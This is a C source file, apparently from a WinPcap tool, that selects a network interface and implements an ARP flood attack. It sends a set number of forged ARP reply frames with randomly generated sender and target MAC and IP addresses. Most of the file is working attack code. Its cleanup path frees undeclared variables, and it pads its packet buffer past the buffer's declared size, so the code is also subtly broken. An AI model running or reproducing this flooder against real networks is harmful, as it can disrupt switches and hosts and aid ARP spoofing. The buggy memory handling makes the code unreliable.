#include "network_utils.h"

pcap_if_t *selectDevice(pcap_if_t ** all_devices) {
    pcap_if_t *d;
    int selected_dev_num = 0;
    int i = 0;
    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &(*all_devices), errbuf) == -1) {
        fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
        exit(1);
    }

    for (d = (*all_devices); d; d = d->next) {
        if (d->description)
            printf("%d (%s)\n", ++i, d->description);
    }

    if (i == 0) {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return NULL;
    }

    //dialog and checking errors
    printf("Enter the interface number (1-%d):", i);
    if (scanf_s("%d", &selected_dev_num) <= 0) {
        printf("ERROR: not a number!\n");
        pcap_freealldevs((*all_devices));
        return NULL;
    }
    if (selected_dev_num < 1 || selected_dev_num > i) {
        printf("\nInterface number out of range.\n");
        pcap_freealldevs((*all_devices));
        return NULL;
    }

    // selecting device
    for (d = (*all_devices), i = 0; i < selected_dev_num - 1; i++, d = d->next);

    return d;
}

void buildEthernetHeader(struct ether_hdr *ether_header, unsigned char *src_mac, unsigned char *dst_mac) {
    memset(ether_header, 0, sizeof(*(ether_header))); // padding with zero's
    memcpy((*ether_header).src, src_mac, ETHER_ADDR_LEN);
    memcpy((*ether_header).dst, dst_mac, ETHER_ADDR_LEN);
    // Note: In the network, the byte order is typically Big Endian, while on the host
    //                           it can be Little Endian depending on the architecture.
    // The function "htons" converts the byte order from host format to network format.
    (*ether_header).type = htons(ARP_ETHERNET_TYPE);
}

void buildArpHeader(struct arp_hdr *arp_header, unsigned char *sender_mac, unsigned char *sender_ip,
                    unsigned char *target_mac, unsigned char *target_ip) {
    memset(arp_header, 0, sizeof((*arp_header)));
    (*arp_header).htype = htons(ARP_HW_TYPE_ETH);
    (*arp_header).ptype = htons(ARP_PROTO_TYPE_IP);
    (*arp_header).hlen = ARP_HW_SIZE;
    (*arp_header).plen = ARP_PROTO_SIZE;
    (*arp_header).oper = htons(ARP_REPLY); // 2
    // memcpy or memset depending on the pointer
    memcpy((*arp_header).sha, sender_mac != NULL ? sender_mac : memset(&((*arp_header).sha), 0, ETHER_ADDR_LEN), ETHER_ADDR_LEN);
    memcpy((*arp_header).spa, sender_ip != NULL ? sender_ip : memset(&((*arp_header).spa), 0, IP_ADDR_LEN), IP_ADDR_LEN);
    memcpy((*arp_header).tha, target_mac != NULL ? target_mac : memset(&((*arp_header).tha), 0, ETHER_ADDR_LEN), ETHER_ADDR_LEN);
    memcpy((*arp_header).tpa, target_ip != NULL ? target_ip : memset(&((*arp_header).tpa), 0, IP_ADDR_LEN), IP_ADDR_LEN);
}

// 0 - success, 1 - error
int sendPacketViaWinPcap(pcap_t *handle, unsigned char *packet, int packet_size) {
    if (pcap_sendpacket(handle, packet, packet_size) != 0) {
        fprintf(stderr, "^Error sending the packet: %s\n", pcap_geterr(handle));
        return 1;
    }
    return 0;
}

// You can change it by adding src_ip, but in this case I decided to make src_ip unknown for greater security
void performArpFloodAttack(pcap_if_t *dev, int num_packets_to_send) {
    if (num_packets_to_send <= 0) {
        return;
    }
    struct ether_hdr ether_header;
    struct arp_hdr arp_header;
    unsigned char *sender_mac = malloc(6 * sizeof(unsigned char));
    unsigned char *sender_ip = malloc(4 * sizeof(unsigned char));
    unsigned char *target_mac = malloc(6 * sizeof(unsigned char));
    unsigned char *target_ip = malloc(4 * sizeof(unsigned char));
    int packet_size = sizeof(ether_header) + sizeof(arp_header);
    unsigned char packet[packet_size];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev->name, BUFSIZ, 0, 1000, errbuf);
    for (int i = 1; i <= num_packets_to_send; i++) {
        generateRandomMAC(sender_mac);
        generateRandomIPv4(sender_ip);
        generateRandomMAC(target_mac);
        generateRandomIPv4(target_ip);
        buildEthernetHeader(&ether_header, sender_mac, target_mac);
        buildArpHeader(&arp_header, sender_mac, sender_ip, target_mac, target_ip);

        memcpy(packet, &ether_header, sizeof(ether_header));
        memcpy(packet + sizeof(ether_header), &arp_header, sizeof(arp_header));

        // padding with zeros (28 bytes initially)
        int padding_size = FRAME_SIZE_TO_SEND - packet_size;
        memset(packet + packet_size, 0, padding_size); // 60 bytes
        packet_size = FRAME_SIZE_TO_SEND;
        /*
        // Optional
        printf("-> Sender MAC: %02X.%02X.%02X.%02X.%02X.%02X\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);
        printf("-> Sender IP: %u.%u.%u.%u\n", sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3]);
        printf(">- Target MAC: %02X.%02X.%02X.%02X.%02X.%02X\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
        printf(">- Target IP: %u.%u.%u.%u\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
        */
        printHexDump(packet, packet_size);
        /*
        // WARNING: WI-FI does not allow sending packets with a MAC address that does not match the MAC address of the adapter
        */
         if (sendPacketViaWinPcap(handle, packet, packet_size) == FAILURE_SEND) {
            pcap_close(handle);
            free(dst_mac);
            free(dst_ip);
            return;
        }
        printf("^Packet %d sent successfully!\n", i);
    }
    pcap_close(handle);
    free(sender_mac);
    free(sender_ip);
    free(target_mac);
    free(target_ip);
}
